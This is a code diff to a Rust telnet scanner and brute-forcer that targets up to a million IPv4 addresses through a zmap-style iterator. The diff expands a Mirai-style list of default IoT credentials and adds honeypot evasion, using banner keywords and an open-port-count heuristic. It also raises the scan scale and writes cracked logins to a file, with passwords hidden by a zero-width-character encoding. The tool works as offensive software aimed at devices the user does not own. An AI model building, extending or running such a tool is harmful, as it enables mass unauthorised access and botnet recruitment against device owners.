@@ -24,6 +24,8 @@ const HONEYPOT_BANNERS: &[&str] = &[
     "cowrie", "honeypot", "HoneyTel", "sensor", "Decoy",
     "My honeypot", "this system is monitored", "forensics",
     "Kippo", "kippo", "TCP Forwarder",
+    "dionaea", "conpot", "glutton", "heralding", "honeytrap",
+    "telnet-iot-honeypot", "ippsec", "elasticpot", "t-pot",
 ];
 
 fn is_honeypot_banner(banner: &str) -> bool {
@@ -34,41 +36,25 @@ fn is_honeypot_banner(banner: &str) -> bool {
 // ── Common Credentials ──────────────────────────────────────────────────────
 
 const COMMON_CREDS: &[(&str, &str)] = &[
-    ("root", "root"),
-    ("root", "admin"),
-    ("root", "password"),
-    ("root", "1234"),
-    ("root", "12345"),
-    ("root", "123456"),
-    ("root", "toor"),
-    ("root", "vizxv"),
-    ("root", "xc3511"),
-    ("root", "888888"),
-    ("root", "666666"),
-    ("root", "54321"),
-    ("admin", "admin"),
-    ("admin", "password"),
-    ("admin", "1234"),
-    ("admin", "12345"),
-    ("admin", "123456"),
-    ("admin", "7ujMko0admin"),
-    ("user", "user"),
-    ("guest", "guest"),
-    ("guest", "12345"),
-    ("support", "support"),
-    ("ubnt", "ubnt"),
-    ("pi", "raspberry"),
-    ("mother", "fucker"),
-    ("service", "service"),
-    ("supervisor", "supervisor"),
-    ("tech", "tech"),
-    ("operator", "operator"),
-    ("default", "default"),
-    ("cisco", "cisco"),
-    ("telnet", "telnet"),
-    ("Administrator", "admin"),
-    ("D-Link", "D-Link"),
-    ("ZTE", "ZTE"),
+    // Tier 1: High-likelihood IoT defaults
+    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"),
+    ("root", "12345"), ("admin", "admin"), ("ubnt", "ubnt"),
+    ("root", "root"), ("root", "password"), ("root", "7ujMko0admin"),
+    ("admin", "7ujMko0admin"), ("support", "support"), ("pi", "raspberry"),
+    ("root", ""), ("admin", ""), ("root", "anko"),
+    // Tier 2: Common fallbacks
+    ("root", "1234"), ("root", "123456"), ("root", "toor"),
+    ("root", "888888"), ("root", "666666"), ("root", "54321"),
+    ("root", "1111"), ("root", "0000"), ("root", "1111111"),
+    ("admin", "password"), ("admin", "1234"), ("admin", "12345"),
+    ("admin", "123456"), ("admin", "1234567"),
+    ("user", "user"), ("guest", "guest"), ("guest", "12345"),
+    ("mother", "fucker"), ("service", "service"),
+    ("supervisor", "supervisor"), ("tech", "tech"),
+    ("operator", "operator"), ("default", "default"),
+    ("cisco", "cisco"), ("telnet", "telnet"),
+    ("Administrator", "admin"), ("D-Link", "D-Link"), ("ZTE", "ZTE"),
+    ("root", "Zte521"), ("root", "admin123"), ("root", "dreambox"),
 ];
 
 // ── CLI ─────────────────────────────────────────────────────────────────────
@@ -96,10 +82,6 @@ struct Cli {
     /// Max concurrent brute-force attempts
     #[arg(long, default_value_t = 32)]
     max_brute_parallel: usize,
-
-    /// Scanner thread count
-    #[arg(long, default_value_t = 24)]
-    scanner_threads: usize,
 
     /// Output file for results
     #[arg(short = 'o', long = "output")]
@@ -136,6 +118,14 @@ struct Cli {
     /// Zmap mode: packets per second rate limit
     #[arg(long, default_value_t = 10000)]
     rate: u32,
+
+    /// Max targets to scan (default: 1M for zmap, unlimited for CIDR/file)
+    #[arg(long, default_value_t = 1_000_000)]
+    max_targets: usize,
+
+    /// Max open ports per host before flagging as potential honeypot
+    #[arg(long, default_value_t = 8)]
+    max_open_ports: usize,
 }
 
 // ── Bogon / IANA Reserved Ranges (RFC 6890 + RFC 8190) ──────────────────────
@@ -165,12 +155,6 @@ const BOGON_RANGES: &[(u32, u32)] = &[
     (0xE0000000, 0xEFFFFFFF), // 224.0.0.0/4
     // Reserved / future use
     (0xF0000000, 0xFFFFFFFF), // 240.0.0.0/4
-    // DHCP auto-config
-    (0xA9FE0000, 0xA9FEFFFF), // 169.254.0.0/16 (dup intentional — double-check)
-    // IANA protocol assignments
-    (0xC0000000, 0xC00000FF), // 192.0.0.0/24
-    // Shared address space
-    (0x64400000, 0x647FFFFF), // 100.64.0.0/10
 ];
 
 /// Check if an IP (as u32) falls within any bogon range.
@@ -299,16 +283,6 @@ fn read_targets_from_stdin() -> Vec<String> {
         .collect()
 }
 
-// ── Scan Types ──────────────────────────────────────────────────────────────
-
-#[derive(Debug, Clone)]
-enum ScanTarget {
-    SingleIp(String),
-    Cidr(ipnet::Ipv4Net),
-    TargetsFile(String),
-    Random,
-}
-
 // ── Scanner ─────────────────────────────────────────────────────────────────
 
 struct Scanner {
@@ -317,6 +291,8 @@ struct Scanner {
     brute_timeout: Duration,
     max_brute_parallel: usize,
     scan_only: bool,
+    max_open_ports: usize,
+    rate: u32,
     results: Vec<ScanResult>,
 }
 
@@ -348,105 +324,10 @@ impl Scanner {
             brute_timeout: Duration::from_secs(cli.brute_timeout),
             max_brute_parallel: cli.max_brute_parallel,
             scan_only: cli.scan_only,
+            max_open_ports: cli.max_open_ports,
+            rate: cli.rate,
             results: Vec::new(),
         }
-    }
-
-    async fn scan_ip(&mut self, ip: &str) {
-        let ports = self.ports.clone();
-        for &port in &ports {
-            let addr = format!("{}:{}", ip, port);
-            debug!("Scanning {}", addr);
-
-            let conn_result = timeout(
-                self.scan_timeout,
-                TcpStream::connect(&addr),
-            )
-            .await;
-
-            match conn_result {
-                Ok(Ok(mut stream)) => {
-                    info!("OPEN: {}", addr);
-                    let mut result = ScanResult {
-                        ip: ip.to_string(),
-                        port,
-                        open: true,
-                        banner: None,
-                        brute_success: None,
-                        is_honeypot: false,
-                    };
-
-                    // Read banner
-                    if let Ok(Ok(banner)) = timeout(
-                        Duration::from_secs(3),
-                        Self::read_banner(&mut stream),
-                    )
-                    .await
-                    {
-                        debug!("Banner from {}: {}", addr, banner);
-                        result.banner = Some(banner.clone());
-
-                        if is_honeypot_banner(&banner) {
-                            warn!("Honeypot detected at {}: {}", addr, banner);
-                            result.is_honeypot = true;
-                        }
-                    }
-
-                    // Try CVE-2026-24061 bypass
-                    if !self.scan_only && !result.is_honeypot {
-                        info!("Attempting brute-force on {}", addr);
-                        let creds = self.brute_force(&mut stream).await;
-                        if let Some(creds) = creds {
-                            info!(
-                                "SUCCESS: {}:{} with {}:{}",
-                                ip, port, creds.username, creds.password
-                            );
-                            result.brute_success = Some(creds);
-                        }
-                    }
-
-                    self.results.push(result);
-                }
-                Ok(Err(e)) => {
-                    debug!("Connection error on {}: {}", addr, e);
-                }
-                Err(_) => {
-                    debug!("Timeout on {}", addr);
-                }
-            }
-        }
-    }
-
-    async fn read_banner(stream: &mut TcpStream) -> std::io::Result<String> {
-        let mut buf = vec![0u8; 1024];
-        let n = stream.try_read(&mut buf)?;
-        if n > 0 {
-            Ok(String::from_utf8_lossy(&buf[..n]).trim().to_string())
-        } else {
-            Ok(String::new())
-        }
-    }
-
-    async fn brute_force(&mut self, stream: &mut TcpStream) -> Option<BruteResult> {
-        for (username, password) in COMMON_CREDS {
-            let result = timeout(self.brute_timeout, try_login(stream, username, password)).await;
-
-            match result {
-                Ok(Ok(true)) => {
-                    return Some(BruteResult {
-                        username: username.to_string(),
-                        password: password.to_string(),
-                    });
-                }
-                Ok(Ok(false)) => continue,
-                Ok(Err(_)) => continue,
-                Err(_) => {
-                    debug!("Brute-force timeout");
-                    break;
-                }
-            }
-        }
-        None
     }
 
     async fn run_scan(&mut self, targets: &[String]) {
@@ -460,10 +341,11 @@ impl Scanner {
             let scan_timeout = self.scan_timeout;
             let brute_timeout = self.brute_timeout;
             let scan_only = self.scan_only;
+            let max_open_ports = self.max_open_ports;
 
             handles.push(tokio::spawn(async move {
                 let _permit = permit;
-                scan_single_ip(&ip, &ports, scan_timeout, brute_timeout, scan_only).await
+                scan_single_ip(&ip, &ports, scan_timeout, brute_timeout, scan_only, max_open_ports).await
             }));
         }
 
@@ -471,6 +353,24 @@ impl Scanner {
             match handle.await {
                 Ok(results) => self.results.extend(results),
                 Err(e) => error!("Scan task panicked: {e}"),
+            }
+        }
+
+        // Post-scan: detect hosts with too many open ports (honeypot indicator)
+        let mut port_counts: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
+        for r in &self.results {
+            if r.open {
+                *port_counts.entry(r.ip.clone()).or_insert(0) += 1;
+            }
+        }
+        for (ip, count) in &port_counts {
+            if *count > self.max_open_ports {
+                warn!("Potential honeypot at {ip}: {count} open ports (> {})", self.max_open_ports);
+                for r in &mut self.results {
+                    if r.ip == *ip && !r.is_honeypot {
+                        r.is_honeypot = true;
+                    }
+                }
             }
         }
     }
@@ -482,6 +382,7 @@ async fn scan_single_ip(
     scan_timeout: Duration,
     brute_timeout: Duration,
     scan_only: bool,
+    _max_open_ports: usize,
 ) -> Vec<ScanResult> {
     let mut results = Vec::new();
 
@@ -640,9 +541,7 @@ fn parse_targets(cli: &Cli) -> Result<Vec<String>, String> {
             shard, total, exclude, cli.rate,
         );
         let iter = ZmapIpIterator::new(shard, total, exclude);
-        // Collect a burst of IPs to avoid iterator churn;
-        // the iterator is stateless — no memory per IP
-        let ips: Vec<String> = iter.take(100_000).collect();
+        let ips: Vec<String> = iter.take(cli.max_targets).collect();
         info!("Generated {} targets from shard", ips.len());
         return Ok(ips);
     }
@@ -652,13 +551,13 @@ fn parse_targets(cli: &Cli) -> Result<Vec<String>, String> {
         let exclude = cli.exclude_bogon;
         info!("Full IPv4 zmap scan (bogon={}, rate={}/s)", exclude, cli.rate);
         let iter = ZmapIpIterator::full(exclude);
-        let ips: Vec<String> = iter.take(100_000).collect();
+        let ips: Vec<String> = iter.take(cli.max_targets).collect();
         info!("Generated {} routable targets", ips.len());
         return Ok(ips);
     }
 
     if cli.random {
-        return Ok(generate_random_ips(100, cli.exclude_bogon));
+        return Ok(generate_random_ips(cli.max_targets.min(10000), cli.exclude_bogon));
     }
 
     let target = cli.target.as_deref().unwrap_or("");
@@ -740,29 +639,26 @@ async fn main() {
         }
     }
 
-    // Save to output file if specified
+    // Save to output file if specified (JSONL: one JSON object per line)
     if let Some(path) = &cli.output {
-        let output_data = serde_json::json!({
-            "total_scanned": targets.len(),
-            "open_ports": open.len(),
-            "honeypots": honeypots.len(),
-            "cracked": cracked.len(),
-            "results": cracked.iter().map(|r| {
-                let creds = r.brute_success.as_ref();
-                serde_json::json!({
-                    "ip": r.ip,
-                    "port": r.port,
-                    "banner": r.banner,
-                    "username": creds.map(|c| &c.username),
-                    "password": creds.map(|c| arcticfox_core::zwcodec::encode(c.password.as_bytes())),
-                    "is_honeypot": r.is_honeypot,
-                })
-            }).collect::<Vec<_>>(),
-        });
-
-        match std::fs::write(path, serde_json::to_string_pretty(&output_data).unwrap_or_default()) {
-            Ok(()) => info!("Results saved to {}", path),
-            Err(e) => error!("Failed to save results: {e}"),
+        let mut file = match std::fs::File::create(path) {
+            Ok(f) => f,
+            Err(e) => { error!("Failed to create output file: {e}"); return; }
+        };
+        use std::io::Write;
+        for r in &scanner.results {
+            if !r.open { continue; }
+            let creds = r.brute_success.as_ref();
+            let line = serde_json::json!({
+                "ip": r.ip,
+                "port": r.port,
+                "banner": r.banner,
+                "username": creds.map(|c| &c.username),
+                "password": creds.map(|c| arcticfox_core::zwcodec::encode(c.password.as_bytes())),
+                "is_honeypot": r.is_honeypot,
+            });
+            let _ = writeln!(file, "{}", serde_json::to_string(&line).unwrap_or_default());
         }
+        info!("Results saved to {} ({} entries)", path, scanner.results.iter().filter(|r| r.open).count());
     }
 }
